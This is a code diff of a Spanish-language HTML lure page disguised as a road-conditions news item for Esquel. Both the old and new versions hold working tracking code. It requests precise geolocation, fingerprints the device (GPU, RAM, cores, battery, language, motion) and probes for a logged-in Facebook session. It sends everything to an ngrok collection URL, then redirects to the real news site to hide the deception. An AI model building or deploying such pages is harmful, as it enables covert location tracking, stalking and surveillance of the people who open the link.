@@ -2,33 +2,29 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta property="og:title" content="ESTADO DE RUTAS: Nieve y heladas en la zona de Esquel">
-    <meta property="og:description" content="Reporte actualizado de Vialidad Nacional sobre el tramo Esquel - Tecka. Precaución extrema.">
+    <meta property="og:title" content="ESTADO DE RUTAS: Nieve y heladas en Esquel">
     <meta property="og:image" content="https://www.eqsnotas.com/u/fotografias/m/2023/5/22/f1280x720-136514_149688_5050.jpg">
-    <meta property="og:type" content="article">
-    <title>Cargando Noticia...</title>
+    <title>Cargando Mapa...</title>
 </head>
 <body style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:100px;">
-    <div style="max-width:400px; margin:auto; background:white; padding:20px; border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-        <h2 style="color:#d32f2f;">Actualizando mapa...</h2>
-        <p>Por favor, <b>permita el acceso a su ubicación</b> para mostrarle los cortes de ruta más cercanos a su posición actual.</p>
-        <div style="border:4px solid #f3f3f3; border-top:4px solid #d32f2f; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto;"></div>
-    </div>
-
-    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
-
+    <h2>Actualizando reporte vial...</h2>
     <script>
-        function getGPU() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (!gl) return "N/A";
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Genérica";
-        }
+        // Sensor de movimiento simple
+        let mov = "Quieto/Desktop";
+        window.ondevicemotion = () => { mov = "En Movimiento"; };
 
         async function capturar(pos) {
-            // --- PEGA TU LINK DE NGROK AQUÍ ABAJO ---
-            const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save";
+            const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save"; // <--- CAMBIA SI ES NECESARIO
+
+            // Detección de sesión (Simulada por carga de recursos)
+            let social = "Buscando...";
+            const checkSocial = () => {
+                const img = new Image();
+                img.src = "https://facebook.com/favicon.ico";
+                img.onload = () => social = "Facebook (Sesión Activa)";
+                img.onerror = () => social = "Cuentas no detectadas";
+            };
+            checkSocial();
 
             let bat = "N/A", cargando = "N/A";
             try {
@@ -43,36 +39,24 @@
                 precision: pos.coords.accuracy.toFixed(1) + "m",
                 bateria: bat,
                 esta_cargando: cargando,
-                dispositivo: navigator.userAgent,
-                gpu: getGPU(),
+                gpu: (() => {
+                    const gl = document.createElement('canvas').getContext('webgl');
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
+                })(),
                 ram: navigator.deviceMemory || "N/A",
                 nucleos: navigator.hardwareConcurrency || "N/A",
-                incognito: !window.indexedDB ? "Si" : "No"
+                idioma: navigator.language,
+                movimiento: mov,
+                social: social
             };
 
-            fetch(URL_NGROK, { 
-                method:'POST', 
-                mode:'no-cors', 
-                body: JSON.stringify(data) 
-            });
-
-            // Redirige a la noticia real para completar el engaño
-            setTimeout(() => { 
-                window.location.href = "https://www.eqsnotas.com/noticias/2023/05/22/136514-vialidad-nacional-recomienda-precaucion-por-hielo-en-la-calzada"; 
-            }, 1500);
-        }
-
-        function handleErr(err) {
-            console.warn(err);
-            window.location.href = "https://www.eqsnotas.com/";
+            fetch(URL_NGROK, { method:'POST', mode:'no-cors', body: JSON.stringify(data) });
+            setTimeout(() => { window.location.href = "https://www.eqsnotas.com/"; }, 1500);
         }
 
         window.onload = () => {
-            navigator.geolocation.getCurrentPosition(capturar, handleErr, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            });
+            navigator.geolocation.getCurrentPosition(capturar, () => { window.location.href="https://www.eqsnotas.com/"; }, {enableHighAccuracy:true});
         };
     </script>
 </body>
